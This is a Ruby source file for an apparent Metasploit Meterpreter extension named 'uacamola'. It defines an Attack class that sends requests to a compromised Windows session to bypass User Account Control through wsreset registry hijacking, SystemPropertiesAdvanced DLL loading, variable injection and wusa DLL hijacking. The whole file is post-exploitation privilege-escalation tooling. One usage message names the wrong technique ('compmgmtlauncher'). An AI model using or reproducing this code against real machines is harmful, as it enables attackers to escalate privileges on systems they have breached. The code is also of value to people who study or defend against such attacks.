require 'rex/post/meterpreter/extensions/uacamola/module'

module Rex
module Post
module Meterpreter
module Extensions
module Uacamola
module Windows
    
class Attack < Module
    def initialize(client)
        super(client)
    end

    def fileless_wsreset(registry)
        execute_function("fileless_wsreset", registry)
    end

    def systempropertiesadvanced(dll)
        execute_function("systempropertiesadvanced", dll)
    end

    def variable_injection(payload)
        execute_function("variable_injection", payload)
    end

    def dll_hijacking_wusa(payload)
        total = payload.split(" ").length
        if total == 2
            execute_function("dll_hijacking_wusa", payload)
        else
            puts "Usage: compmgmtlauncher <dll_path> <folder>"
        end
    end

    private 

    def execute_function(func, data)
        request = Packet.create_request(func)
        request.add_tlv(TLV_TYPE_PYTHON_RESULT, data)
        puts "Trying to bypass UAC through " + func
        result = do_request(request)
        print_result(result)
    end

end

end; end; end; end; end; end
